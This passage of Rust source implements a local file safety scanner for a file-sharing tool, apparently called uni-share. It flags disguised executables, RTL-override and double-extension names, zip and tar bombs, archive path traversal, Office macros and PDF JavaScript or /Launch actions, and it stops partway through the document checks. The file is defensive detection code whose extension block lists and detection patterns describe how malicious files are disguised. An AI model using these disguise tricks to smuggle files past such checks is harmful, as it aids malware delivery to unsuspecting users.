//! Local **file safety scanner** — runs on everything uni-share writes to disk
//! (LAN receptions, downloads) before the user opens it.
//!
//! Design goals:
//! * **100 % local.** No hashes are sent anywhere, no reputation services.
//! * **Defence in depth, not a silver bullet.** Static heuristics catch the
//!   classic "someone sent me `invoice.pdf.exe`" cases and archive bombs; a real
//!   antivirus is only used when the user already has one installed
//!   (**ClamAV** via `clamdscan`/`clamscan`, opt-in, never downloaded by us).
//! * **Explainable.** Every finding has a severity, a stable code and a human
//!   message, so CLI/GUIs can show *why* something is flagged and let the user
//!   decide (quarantine = rename to `<name>.unishare-quarantine`).
//!
//! Checks (all cheap, bounded I/O — heads/tails, central directories, headers):
//! 1. **Magic vs extension** — sniff the first bytes and compare with what the
//!    extension claims. A benign extension hiding an executable is `Danger`;
//!    other mismatches are `Warning`.
//! 2. **Executable content** — PE, ELF, Mach-O, shebang scripts, Java class,
//!    JAR/APK, Windows `.lnk`.
//! 3. **Dangerous extensions** — `.exe .scr .bat .cmd .ps1 .vbs .js .hta .lnk
//!    .msi .jar .reg .dll .sh …` and Office macro formats.
//! 4. **Trick names** — double extension (`foto.jpg.exe`), RTL override
//!    (`U+202E`), zero-width chars, padded spaces, Windows reserved names.
//! 5. **Archives** — ZIP central directory parsed in place (no extraction):
//!    zip bombs (ratio / declared size / entry count), path traversal, nested
//!    archives, executables inside, encrypted entries, OOXML `vbaProject.bin`.
//!    `tar` / `tar.zst` (our own transfer format) are streamed header-by-header
//!    with a byte budget: traversal, setuid bits, escaping links.
//! 6. **Documents** — PDF `/JavaScript`, `/Launch`, `/EmbeddedFile`, auto
//!    actions; legacy OLE with VBA / `Ole10Native` / `DDEAUTO`; SVG/HTML with
//!    `<script>`, iframes, meta refresh; `.desktop`/`.url` shortcuts with
//!    `Exec=`; plain text carrying PowerShell/cmd one-liners.
//! 7. **Size sanity** against the manifest/ticket size when known.
//! 8. **ClamAV** (optional) — if `clamdscan`/`clamscan` exists and
//!    `scan.clamav = true`: `FOUND` lines → `Danger` with the signature name.
//!    Its absence is reported as an engine note, never as an error.

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::io::{Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::time::Duration;

// ───────────────────────── limits ─────────────────────────

const HEAD: usize = 8192;
const TAIL: usize = 66 * 1024;
const TEXT_SCAN: u64 = 32 * 1024 * 1024;
const BOMB_RATIO: u64 = 100;
const BOMB_UNCOMPRESSED: u64 = 20 * 1024 * 1024 * 1024;
const MAX_ARCHIVE_ENTRIES: usize = 200_000;
const MAX_NESTING: u32 = 3;
const TAR_BUDGET: u64 = 8 * 1024 * 1024 * 1024;
const CLAMAV_TIMEOUT: Duration = Duration::from_secs(120);

// ───────────────────────── model ─────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    #[default]
    Info,
    Warning,
    Danger,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Warning => "aviso",
            Severity::Danger => "PELIGRO",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    /// Stable machine code, e.g. `magic_mismatch`, `zip_bomb`, `clamav`.
    pub code: String,
    pub message: String,
}

impl Finding {
    fn new(severity: Severity, code: &'static str, message: impl Into<String>) -> Self {
        Self { severity, code: code.into(), message: message.into() }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileReport {
    pub path: PathBuf,
    pub size: u64,
    /// Detected content type (`pe`, `elf`, `zip`, `pdf`, `png`, `text`, `unknown`…).
    pub kind: String,
    pub findings: Vec<Finding>,
    /// Set when the file was renamed to `*.unishare-quarantine`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub quarantined: Option<PathBuf>,
}

impl FileReport {
    pub fn severity(&self) -> Severity {
        self.findings.iter().map(|f| f.severity).max().unwrap_or(Severity::Info)
    }
    pub fn is_clean(&self) -> bool {
        self.findings.iter().all(|f| f.severity == Severity::Info)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Report {
    pub files: Vec<FileReport>,
    /// Engines that ran: `heuristics`, `clamav (clamdscan 1.4.1)`, `clamav: no instalado`.
    pub engines: Vec<String>,
    pub duration_ms: u64,
}

impl Report {
    pub fn severity(&self) -> Severity {
        self.files.iter().map(FileReport::severity).max().unwrap_or(Severity::Info)
    }
    pub fn dangers(&self) -> usize {
        self.files.iter().filter(|f| f.severity() == Severity::Danger).count()
    }
    pub fn warnings(&self) -> usize {
        self.files.iter().filter(|f| f.severity() == Severity::Warning).count()
    }
    pub fn is_clean(&self) -> bool {
        self.files.iter().all(FileReport::is_clean)
    }
    pub fn quarantined(&self) -> usize {
        self.files.iter().filter(|f| f.quarantined.is_some()).count()
    }
    /// One-line summary for logs/toasts.
    pub fn summary(&self) -> String {
        let n = self.files.len();
        match (self.dangers(), self.warnings()) {
            (0, 0) => format!("Análisis de seguridad: {n} archivo(s) sin hallazgos ({})", self.engines.join(", ")),
            (d, w) => format!("Análisis de seguridad: {d} peligroso(s), {w} con avisos de {n} archivo(s) ({})", self.engines.join(", ")),
        }
    }
    /// Multi-line detail (CLI / job log). Clean files are omitted.
    pub fn detail(&self) -> String {
        let mut s = String::new();
        for f in &self.files {
            if f.is_clean() {
                continue;
            }
            s.push_str(&format!("{} [{}] {}\n", f.severity().label(), f.kind, f.path.display()));
            for x in f.findings.iter().filter(|x| x.severity != Severity::Info) {
                s.push_str(&format!("    - {}: {}\n", x.code, x.message));
            }
            if let Some(q) = &f.quarantined {
                s.push_str(&format!("    → en cuarentena: {}\n", q.display()));
            }
        }
        s
    }
}

/// What to do with files flagged as `Danger`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum DangerAction {
    Report,
    /// Rename to `<name>.unishare-quarantine` (not executable, obvious to the user).
    #[default]
    Quarantine,
    Delete,
}

/// Scanner settings (`[scan]` in `config.toml`).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct ScanConfig {
    /// Master switch: scan everything received/downloaded.
    pub enabled: bool,
    /// Use ClamAV when `clamdscan`/`clamscan` is installed.
    pub clamav: bool,
    /// Explicit ClamAV binary (otherwise looked up on PATH and common locations).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub clamav_path: Option<PathBuf>,
    pub on_danger: DangerAction,
    /// Skip ClamAV for files larger than this many MiB (0 = no limit).
    pub max_file_mib: u64,
}

impl Default for ScanConfig {
    fn default() -> Self {
        Self { enabled: true, clamav: true, clamav_path: None, on_danger: DangerAction::Quarantine, max_file_mib: 0 }
    }
}

// ───────────────────────── entry points ─────────────────────────

/// Scan files or directories (recursive). Blocking; see [`scan_paths_async`].
pub fn scan_paths(paths: &[PathBuf], cfg: &ScanConfig) -> Report {
    let t0 = std::time::Instant::now();
    let mut files: Vec<PathBuf> = Vec::new();
    for p in paths {
        if p.is_dir() {
            for e in walkdir::WalkDir::new(p).follow_links(false).into_iter().filter_map(|e| e.ok()) {
                if e.file_type().is_file() {
                    files.push(e.into_path());
                }
            }
        } else if p.is_file() {
            files.push(p.clone());
        }
    }
    let mut report = Report { engines: vec!["heuristics".into()], ..Default::default() };
    for f in &files {
        report.files.push(scan_file(f, None));
    }
    if cfg.clamav {
        match clamav::locate(cfg.clamav_path.as_deref()) {
            Some(bin) => {
                report.engines.push(clamav::describe(&bin));
                let limit = cfg.max_file_mib.checked_mul(1024 * 1024).filter(|l| *l > 0);
                for fr in report.files.iter_mut() {
                    if limit.map(|l| fr.size > l).unwrap_or(false) {
                        fr.findings.push(Finding::new(Severity::Info, "clamav_skipped", "archivo demasiado grande para ClamAV (scan.max_file_mib)"));
                        continue;
                    }
                    match clamav::scan(&bin, &fr.path) {
                        Ok(Some(sig)) => fr.findings.push(Finding::new(Severity::Danger, "clamav", format!("ClamAV: {sig}"))),
                        Ok(None) => {}
                        Err(e) => fr.findings.push(Finding::new(Severity::Info, "clamav_error", format!("ClamAV no pudo analizar: {e:#}"))),
                    }
                }
            }
            None => report.engines.push("clamav: no instalado".into()),
        }
    }
    if cfg.on_danger != DangerAction::Report {
        for fr in report.files.iter_mut().filter(|f| f.severity() == Severity::Danger) {
            match cfg.on_danger {
                DangerAction::Quarantine => {
                    if let Ok(q) = quarantine(&fr.path) {
                        fr.quarantined = Some(q);
                    }
                }
                DangerAction::Delete => {
                    let _ = std::fs::remove_file(&fr.path);
                }
                DangerAction::Report => {}
            }
        }
    }
    report.duration_ms = t0.elapsed().as_millis() as u64;
    report
}

/// Async wrapper (blocking pool).
pub async fn scan_paths_async(paths: Vec<PathBuf>, cfg: ScanConfig) -> Report {
    tokio::task::spawn_blocking(move || scan_paths(&paths, &cfg)).await.unwrap_or_default()
}

/// Rename a dangerous file so it cannot be double-clicked by accident.
pub fn quarantine(path: &Path) -> Result<PathBuf> {
    let name = path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "file".into());
    let mut q = path.with_file_name(format!("{name}.unishare-quarantine"));
    let mut i = 1;
    while q.exists() {
        q = path.with_file_name(format!("{name}.{i}.unishare-quarantine"));
        i += 1;
    }
    std::fs::rename(path, &q).with_context(|| format!("quarantining {}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&q, std::fs::Permissions::from_mode(0o600));
    }
    Ok(q)
}

/// Heuristic scan of one file. `expected_size` comes from a manifest/ticket when known.
pub fn scan_file(path: &Path, expected_size: Option<u64>) -> FileReport {
    let mut findings = Vec::new();
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            findings.push(Finding::new(Severity::Warning, "unreadable", format!("no se puede leer: {e}")));
            return FileReport { path: path.to_path_buf(), size: 0, kind: "unknown".into(), findings, quarantined: None };
        }
    };
    let size = meta.len();
    let name = path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
    let (head, tail) = read_head_tail(path, size);
    let kind = sniff(&head, &tail);
    let ext = last_ext(&name);

    check_name(&name, &mut findings);
    check_size(size, expected_size, &mut findings);
    check_magic_vs_ext(kind, &ext, &name, &mut findings);
    check_executable(kind, &head, &ext, &mut findings);

    match kind {
        "zip" | "ooxml" | "jar" | "apk" => archives::check_zip(path, size, 0, &mut findings),
        "tar" => archives::check_tar(path, false, &mut findings),
        "zstd" if name.ends_with(".tar.zst") || name.ends_with(".tzst") => archives::check_tar(path, true, &mut findings),
        "pdf" => documents::check_pdf(path, size, &mut findings),
        "ole" => documents::check_ole(path, size, &mut findings),
        "html" | "svg" | "xml" | "text" => documents::check_text(path, size, &ext, &mut findings),
        _ => {}
    }
    if kind == "ooxml" {
        documents::check_ooxml_ext(&ext, &mut findings);
    }

    FileReport { path: path.to_path_buf(), size, kind: kind.into(), findings, quarantined: None }
}

// ───────────────────────── helpers ─────────────────────────

fn read_head_tail(path: &Path, size: u64) -> (Vec<u8>, Vec<u8>) {
    let mut head = Vec::new();
    let mut tail = Vec::new();
    if let Ok(mut f) = std::fs::File::open(path) {
        let mut buf = vec![0u8; HEAD.min(size as usize)];
        if f.read_exact(&mut buf).is_ok() {
            head = buf;
        }
        if size > HEAD as u64 {
            let n = TAIL.min(size as usize);
            let mut buf = vec![0u8; n];
            if f.seek(SeekFrom::End(-(n as i64))).is_ok() && f.read_exact(&mut buf).is_ok() {
                tail = buf;
            }
        } else {
            tail = head.clone();
        }
    }
    (head, tail)
}

pub fn last_ext(name: &str) -> String {
    Path::new(name).extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default()
}

pub fn memfind(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

/// Content sniffing by magic bytes → short kind label.
pub fn sniff(head: &[u8], tail: &[u8]) -> &'static str {
    let h = head;
    if h.len() >= 2 && &h[..2] == b"MZ" {
        return "pe";
    }
    if h.starts_with(b"\x7fELF") {
        return "elf";
    }
    if h.len() >= 4 && matches!(&h[..4], b"\xfe\xed\xfa\xce" | b"\xfe\xed\xfa\xcf" | b"\xce\xfa\xed\xfe" | b"\xcf\xfa\xed\xfe") {
        return "macho";
    }
    if h.starts_with(b"\xca\xfe\xba\xbe") {
        return "javaclass";
    }
    if h.starts_with(b"%PDF") {
        return "pdf";
    }
    if h.starts_with(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1") {
        return "ole";
    }
    if h.starts_with(b"PK\x03\x04") || h.starts_with(b"PK\x05\x06") || h.starts_with(b"PK\x07\x08") {
        let has = |needle: &[u8]| memfind(h, needle).is_some() || memfind(tail, needle).is_some();
        if has(b"[Content_Types].xml") || has(b"word/") || has(b"xl/") || has(b"ppt/") {
            return "ooxml";
        }
        if has(b"AndroidManifest.xml") || has(b"classes.dex") {
            return "apk";
        }
        if has(b"META-INF/MANIFEST.MF") {
            return "jar";
        }
        return "zip";
    }
    if h.starts_with(b"\x1f\x8b") {
        return "gzip";
    }
    if h.starts_with(b"\x28\xb5\x2f\xfd") {
        return "zstd";
    }
    if h.starts_with(b"Rar!\x1a\x07") {
        return "rar";
    }
    if h.starts_with(b"7z\xbc\xaf\x27\x1c") {
        return "7z";
    }
    if h.starts_with(b"BZh") {
        return "bzip2";
    }
    if h.starts_with(b"\xfd7zXZ\x00") {
        return "xz";
    }
    if h.len() > 262 && &h[257..262] == b"ustar" {
        return "tar";
    }
    if h.starts_with(b"\x89PNG\r\n\x1a\n") {
        return "png";
    }
    if h.starts_with(b"\xff\xd8\xff") {
        return "jpeg";
    }
    if h.starts_with(b"GIF87a") || h.starts_with(b"GIF89a") {
        return "gif";
    }
    if h.len() >= 12 && &h[..4] == b"RIFF" && &h[8..12] == b"WEBP" {
        return "webp";
    }
    if h.len() >= 12 && &h[..4] == b"RIFF" && &h[8..12] == b"WAVE" {
        return "wav";
    }
    if h.starts_with(b"BM") && h.len() > 14 {
        return "bmp";
    }
    if h.len() >= 12 && &h[4..8] == b"ftyp" {
        return "mp4";
    }
    if h.starts_with(b"\x1aE\xdf\xa3") {
        return "matroska";
    }
    if h.starts_with(b"ID3") || (h.len() >= 2 && h[0] == 0xff && (h[1] & 0xe0) == 0xe0) {
        return "mp3";
    }
    if h.starts_with(b"OggS") {
        return "ogg";
    }
    if h.starts_with(b"fLaC") {
        return "flac";
    }
    if h.starts_with(b"SQLite format 3\0") {
        return "sqlite";
    }
    if h.starts_with(b"UNISHARE") {
        return "unishare";
    }
    if h.starts_with(b"L\x00\x00\x00\x01\x14\x02\x00") {
        return "lnk";
    }
    if h.starts_with(b"#!") {
        return "script";
    }
    if h.starts_with(b"{\\rtf") {
        return "rtf";
    }
    let sample = &h[..h.len().min(4096)];
    if sample.is_empty() {
        return "empty";
    }
    let printable = sample.iter().filter(|b| b.is_ascii_graphic() || b.is_ascii_whitespace() || **b >= 0x80).count();
    let text_like = !sample.contains(&0) && printable * 100 / sample.len() > 92;
    if text_like {
        let lower: Vec<u8> = sample.iter().map(|b| b.to_ascii_lowercase()).collect();
        if memfind(&lower, b"<svg").is_some() {
            return "svg";
        }
        if memfind(&lower, b"<html").is_some() || memfind(&lower, b"<!doctype html").is_some() || memfind(&lower, b"<script").is_some() {
            return "html";
        }
        if lower.starts_with(b"<?xml") {
            return "xml";
        }
        return "text";
    }
    "unknown"
}

const DANGEROUS_EXT: &[&str] = &[
    "exe", "scr", "pif", "com", "bat", "cmd", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta", "lnk", "msi", "msp", "jar", "reg", "dll",
    "sys", "cpl", "inf", "app", "dmg", "pkg", "sh", "run", "bin", "elf", "so", "dylib", "docm", "xlsm", "pptm", "dotm", "xlam", "ppam", "sct",
    "url", "desktop", "gadget", "apk", "xpi", "crx",
];
const EXEC_KINDS: &[&str] = &["pe", "elf", "macho", "javaclass", "script", "jar", "apk", "lnk"];
/// Benign "document/media" extensions attackers like to disguise as.
const BENIGN_EXT: &[&str] = &[
    "jpg", "jpeg", "png", "gif", "webp", "bmp", "pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "mp3", "mp4", "mkv",
    "avi", "mov", "wav", "flac", "ogg", "zip", "csv", "json", "md", "rtf", "svg", "heic", "epub",
];
const ARCHIVE_EXT: &[&str] = &["zip", "7z", "rar", "gz", "tgz", "xz", "bz2", "zst", "tar", "jar"];

fn check_name(name: &str, out: &mut Vec<Finding>) {
    if name.contains(['\u{202e}', '\u{202b}', '\u{202d}']) {
        out.push(Finding::new(Severity::Danger, "rtl_override", "el nombre contiene caracteres de control bidireccional (RTLO): la extensión visible no es la real"));
    }
    if name.contains(['\u{200b}', '\u{200c}', '\u{200d}', '\u{feff}', '\u{00ad}']) {
        out.push(Finding::new(Severity::Warning, "zero_width", "el nombre contiene caracteres invisibles (ancho cero)"));
    }
    if name.chars().any(char::is_control) {
        out.push(Finding::new(Severity::Warning, "control_chars", "el nombre contiene caracteres de control"));
    }
    let parts: Vec<&str> = name.split('.').collect();
    if parts.len() >= 3 {
        let last = parts[parts.len() - 1].to_lowercase();
        let prev = parts[parts.len() - 2].to_lowercase();
        if DANGEROUS_EXT.contains(&last.as_str()) && BENIGN_EXT.contains(&prev.as_str()) {
            out.push(Finding::new(Severity::Danger, "double_extension", format!("doble extensión engañosa: parece .{prev} pero es .{last}")));
        }
    }
    if let Some(stem) = Path::new(name).file_stem().and_then(|s| s.to_str()) {
        if stem.contains("     ") {
            out.push(Finding::new(Severity::Warning, "padded_name", "el nombre tiene un bloque largo de espacios que puede ocultar la extensión real"));
        }
        const RESERVED: &[&str] = &["CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "LPT1", "LPT2", "LPT3"];
        if RESERVED.contains(&stem.to_uppercase().as_str()) {
            out.push(Finding::new(Severity::Warning, "reserved_name", "nombre reservado en Windows"));
        }
    }
    let ext = last_ext(name);
    if DANGEROUS_EXT.contains(&ext.as_str()) {
        out.push(Finding::new(Severity::Warning, "dangerous_extension", format!("extensión ejecutable/script: .{ext}")));
    }
}

fn check_size(size: u64, expected: Option<u64>, out: &mut Vec<Finding>) {
    if let Some(exp) = expected {
        if exp != size {
            out.push(Finding::new(Severity::Warning, "size_mismatch", format!("tamaño en disco {size} ≠ declarado {exp}")));
        }
    }
    if size == 0 {
        out.push(Finding::new(Severity::Info, "empty", "archivo vacío"));
    }
}

fn check_magic_vs_ext(kind: &str, ext: &str, name: &str, out: &mut Vec<Finding>) {
    if ext.is_empty() || kind == "unknown" || kind == "empty" {
        return;
    }
    let expected: &[&str] = match ext {
        "jpg" | "jpeg" => &["jpeg"],
        "png" => &["png"],
        "gif" => &["gif"],
        "webp" => &["webp"],
        "bmp" => &["bmp"],
        "pdf" => &["pdf"],
        "zip" => &["zip", "ooxml", "jar", "apk"],
        "jar" => &["jar", "zip"],
        "apk" => &["apk", "zip"],
        "docx" | "xlsx" | "pptx" | "docm" | "xlsm" | "pptm" => &["ooxml", "zip"],
        "doc" | "xls" | "ppt" | "msi" => &["ole"],
        "mp4" | "m4a" | "mov" | "heic" => &["mp4"],
        "mkv" | "webm" => &["matroska"],
        "mp3" => &["mp3"],
        "ogg" | "opus" => &["ogg"],
        "flac" => &["flac"],
        "wav" => &["wav"],
        "gz" | "tgz" => &["gzip"],
        "zst" | "tzst" => &["zstd"],
        "xz" => &["xz"],
        "bz2" => &["bzip2"],
        "7z" => &["7z"],
        "rar" => &["rar"],
        "tar" => &["tar"],
        "exe" | "dll" | "scr" | "sys" | "cpl" => &["pe"],
        "svg" => &["svg", "xml", "text"],
        "html" | "htm" => &["html", "text"],
        "xml" => &["xml", "text", "svg", "html"],
        "txt" | "md" | "csv" | "json" | "log" | "ini" | "toml" | "yaml" | "yml" => &["text", "html", "xml", "svg", "script"],
        "unishare" => &["unishare"],
        "sqlite" | "db" => &["sqlite"],
        _ => return,
    };
    if expected.contains(&kind) {
        return;
    }
    if EXEC_KINDS.contains(&kind) && BENIGN_EXT.contains(&ext) {
        out.push(Finding::new(Severity::Danger, "disguised_executable", format!("«{name}» dice ser .{ext} pero su contenido es un ejecutable ({kind})")));
    } else {
        out.push(Finding::new(Severity::Warning, "magic_mismatch", format!("la extensión .{ext} no coincide con el contenido detectado ({kind})")));
    }
}

fn check_executable(kind: &str, head: &[u8], ext: &str, out: &mut Vec<Finding>) {
    if !EXEC_KINDS.contains(&kind) {
        return;
    }
    // Disguised executables were already reported as Danger.
    if BENIGN_EXT.contains(&ext) && kind != "script" {
        return;
    }
    let what = match kind {
        "pe" => "ejecutable Windows (PE)".to_string(),
        "elf" => "ejecutable Linux (ELF)".into(),
        "macho" => "ejecutable macOS (Mach-O)".into(),
        "javaclass" => "clase Java".into(),
        "jar" => "archivo Java ejecutable (JAR)".into(),
        "apk" => "paquete Android (APK)".into(),
        "lnk" => "acceso directo de Windows (.lnk): puede lanzar comandos".into(),
        "script" => {
            let line = head.split(|b| *b == b'\n').next().unwrap_or(&[]);
            format!("script con shebang `{}`", String::from_utf8_lossy(line).trim())
        }
        _ => kind.into(),
    };
    out.push(Finding::new(Severity::Warning, "executable", what));
}

fn preview(v: &[String]) -> String {
    let mut s = v.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
    if v.len() > 3 {
        s.push_str(&format!(" … (+{})", v.len() - 3));
    }
    s
}

// ───────────────────────── archives ─────────────────────────

mod archives {
    use super::*;

    /// Parse the ZIP central directory from the tail (no extraction).
    pub fn check_zip(path: &Path, size: u64, depth: u32, out: &mut Vec<Finding>) {
        let Ok(mut f) = std::fs::File::open(path) else { return };
        let n = TAIL.min(size as usize);
        let mut tail = vec![0u8; n];
        if f.seek(SeekFrom::End(-(n as i64))).is_err() || f.read_exact(&mut tail).is_err() {
            return;
        }
        let Some(eocd) = tail.windows(4).rposition(|w| w == b"PK\x05\x06") else {
            out.push(Finding::new(Severity::Warning, "zip_truncated", "ZIP sin directorio central (truncado o corrupto)"));
            return;
        };
        let e = &tail[eocd..];
        if e.len() < 22 {
            return;
        }
        let entries = u16::from_le_bytes([e[10], e[11]]) as usize;
        let cd_size = u32::from_le_bytes([e[12], e[13], e[14], e[15]]) as u64;
        let cd_off = u32::from_le_bytes([e[16], e[17], e[18], e[19]]) as u64;
        if entries == 0xffff || cd_size == 0xffff_ffff || cd_off == 0xffff_ffff {
            out.push(Finding::new(Severity::Info, "zip64", "ZIP64: directorio no analizado en detalle"));
            return;
        }
        if cd_off.saturating_add(cd_size) > size {
            out.push(Finding::new(Severity::Warning, "zip_truncated", "directorio central fuera del archivo (corrupto o multivolumen)"));
            return;
        }
        if entries > MAX_ARCHIVE_ENTRIES {
            out.push(Finding::new(Severity::Danger, "zip_bomb", format!("{entries} entradas: posible bomba de descompresión")));
            return;
        }
        let mut cd = vec![0u8; cd_size.min(64 * 1024 * 1024) as usize];
        if f.seek(SeekFrom::Start(cd_off)).is_err() || f.read_exact(&mut cd).is_err() {
            return;
        }
        let (mut pos, mut seen) = (0usize, 0usize);
        let (mut total_unc, mut total_comp) = (0u64, 0u64);
        let mut encrypted = 0usize;
        let (mut nested, mut execs, mut traversal) = (Vec::new(), Vec::new(), Vec::new());
        while pos + 46 <= cd.len() && &cd[pos..pos + 4] == b"PK\x01\x02" && seen < entries {
            let flags = u16::from_le_bytes([cd[pos + 8], cd[pos + 9]]);
            let comp = u32::from_le_bytes([cd[pos + 20], cd[pos + 21], cd[pos + 22], cd[pos + 23]]) as u64;
            let unc = u32::from_le_bytes([cd[pos + 24], cd[pos + 25], cd[pos + 26], cd[pos + 27]]) as u64;
            let nlen = u16::from_le_bytes([cd[pos + 28], cd[pos + 29]]) as usize;
            let xlen = u16::from_le_bytes([cd[pos + 30], cd[pos + 31]]) as usize;
            let clen = u16::from_le_bytes([cd[pos + 32], cd[pos + 33]]) as usize;
            let name_end = (pos + 46 + nlen).min(cd.len());
            let name = String::from_utf8_lossy(&cd[pos + 46..name_end]).to_string();
            total_unc = total_unc.saturating_add(unc);
            total_comp = total_comp.saturating_add(comp);
            if flags & 1 != 0 {
                encrypted += 1;
            }
            if name.contains("../") || name.contains("..\\") || name.starts_with(['/', '\\']) || name.get(1..2) == Some(":") {
                traversal.push(name.clone());
            }
            let ext = last_ext(&name);
            if ARCHIVE_EXT.contains(&ext.as_str()) {
                nested.push(name.clone());
            }
            if DANGEROUS_EXT.contains(&ext.as_str()) {
                execs.push(name.clone());
            }
            if name.ends_with("vbaProject.bin") {
                out.push(Finding::new(Severity::Danger, "office_macro", "documento Office con macros VBA (vbaProject.bin)"));
            }
            pos += 46 + nlen + xlen + clen;
            seen += 1;
        }
        let ratio_bomb = total_comp > 0 && total_unc / total_comp.max(1) > BOMB_RATIO && total_unc > 64 * 1024 * 1024;
        if total_unc > BOMB_UNCOMPRESSED || ratio_bomb {
            out.push(Finding::new(
                Severity::Danger,
                "zip_bomb",
                format!("bomba de descompresión: {} declarados frente a {} comprimidos", crate::fsutil::human_bytes(total_unc), crate::fsutil::human_bytes(total_comp)),
            ));
        }
        if !traversal.is_empty() {
            out.push(Finding::new(Severity::Danger, "zip_traversal", format!("rutas con escape de directorio: {}", preview(&traversal))));
        }
        if !execs.is_empty() {
            out.push(Finding::new(Severity::Warning, "archive_executable", format!("contiene ejecutables/scripts: {}", preview(&execs))));
        }
        if !nested.is_empty() {
            let sev = if depth + 1 >= MAX_NESTING { Severity::Warning } else { Severity::Info };
            out.push(Finding::new(sev, "nested_archive", format!("archivos anidados: {}", preview(&nested))));
        }
        if encrypted > 0 {
            out.push(Finding::new(Severity::Warning, "encrypted_entries", format!("{encrypted} entrada(s) cifradas: no se pueden analizar")));
        }
    }

    /// Stream a tar (optionally zstd) reading headers only, within a byte budget.
    pub fn check_tar(path: &Path, zst: bool, out: &mut Vec<Finding>) {
        let Ok(f) = std::fs::File::open(path) else { return };
        let reader: Box<dyn Read> = if zst {
            match zstd::stream::read::Decoder::new(f) {
                Ok(d) => Box::new(d),
                Err(_) => return,
            }
        } else {
            Box::new(f)
        };
        let mut ar = tar::Archive::new(Budget { inner: reader, left: TAR_BUDGET });
        let Ok(entries) = ar.entries() else { return };
        let (mut total, mut count) = (0u64, 0usize);
        let (mut traversal, mut execs, mut links, mut nested) = (Vec::new(), Vec::new(), Vec::new(), Vec::new());
        for e in entries {
            let Ok(e) = e else { break };
            count += 1;
            if count > MAX_ARCHIVE_ENTRIES {
                out.push(Finding::new(Severity::Danger, "tar_bomb", "demasiadas entradas"));
                return;
            }
            let hdr = e.header();
            total = total.saturating_add(hdr.size().unwrap_or(0));
            let p = hdr.path().map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
            if p.contains("../") || p.starts_with('/') {
                traversal.push(p.clone());
            }
            let ext = last_ext(&p);
            if DANGEROUS_EXT.contains(&ext.as_str()) {
                execs.push(p.clone());
            }
            if ARCHIVE_EXT.contains(&ext.as_str()) {
                nested.push(p.clone());
            }
            let et = hdr.entry_type();
            if et.is_symlink() || et.is_hard_link() {
                if let Ok(Some(t)) = hdr.link_name() {
                    let t = t.to_string_lossy().to_string();
                    if t.starts_with('/') || t.contains("../") {
                        links.push(format!("{p} → {t}"));
                    }
                }
            }
            if let Ok(mode) = hdr.mode() {
                if mode & 0o6000 != 0 {
                    out.push(Finding::new(Severity::Danger, "tar_setuid", format!("entrada con bit setuid/setgid: {p}")));
                }
            }
        }
        if total > BOMB_UNCOMPRESSED {
            out.push(Finding::new(Severity::Danger, "tar_bomb", format!("declara {} descomprimidos", crate::fsutil::human_bytes(total))));
        }
        if !traversal.is_empty() {
            out.push(Finding::new(Severity::Danger, "tar_traversal", format!("rutas con escape de directorio: {}", preview(&traversal))));
        }
        if !links.is_empty() {
            out.push(Finding::new(Severity::Danger, "tar_link_escape", format!("enlaces que apuntan fuera: {}", preview(&links))));
        }
        if !execs.is_empty() {
            out.push(Finding::new(Severity::Warning, "archive_executable", format!("contiene ejecutables/scripts: {}", preview(&execs))));
        }
        if !nested.is_empty() {
            out.push(Finding::new(Severity::Info, "nested_archive", format!("archivos anidados: {}", preview(&nested))));
        }
    }

    struct Budget<R: Read> {
        inner: R,
        left: u64,
    }
    impl<R: Read> Read for Budget<R> {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            if self.left == 0 {
                return Ok(0);
            }
            let max = buf.len().min(self.left as usize);
            let n = self.inner.read(&mut buf[..max])?;
            self.left -= n as u64;
            Ok(n)
        }
    }
}

// ───────────────────────── documents ─────────────────────────

mod documents {
    use super::*;

    fn read_limited(path: &Path, size: u64) -> Vec<u8> {
        let mut v = Vec::new();
        if let Ok(f) = std::fs::File::open(path) {
            let _ = f.take(TEXT_SCAN.min(size)).read_to_end(&mut v);
        }
        v
    }

    pub fn check_pdf(path: &Path, size: u64, out: &mut Vec<Finding>) {
        let data = read_limited(path, size);
        let has = |n: &[u8]| memfind(&data, n).is_some();
        let js = has(b"/JavaScript") || has(b"/JS ") || has(b"/JS<") || has(b"/JS/") || has(b"/JS(") || has(b"/J#61vaScript");
        if js {
            out.push(Finding::new(Severity::Danger, "pdf_javascript", "PDF con JavaScript embebido"));
        }
        if has(b"/Launch") {
            out.push(Finding::new(Severity::Danger, "pdf_launch", "PDF con acción /Launch (ejecuta programas)"));
        }
        if has(b"/EmbeddedFile") {
            out.push(Finding::new(Severity::Warning, "pdf_embedded", "PDF con archivos embebidos"));
        }
        if has(b"/OpenAction") && !js {
            out.push(Finding::new(Severity::Info, "pdf_openaction", "PDF con acción al abrir"));
        }
